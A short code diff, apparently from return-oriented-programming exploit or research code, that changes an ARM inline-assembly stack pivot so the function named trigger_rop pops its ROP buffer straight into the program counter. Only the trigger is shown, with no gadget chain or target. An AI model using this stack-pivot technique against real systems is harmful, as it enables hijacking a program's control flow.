@@ -24,7 +24,7 @@ static char *rop_payload;
 static void __attribute__((naked,noreturn)) trigger_rop(void)
 {
     __asm__ ("mov sp, %0\t\n"
-             "pop {lr}\t\n" :: "r" (rop_payload));
+             "pop {pc}\t\n" :: "r" (rop_payload));
 }
 
 // pure memory intensive load
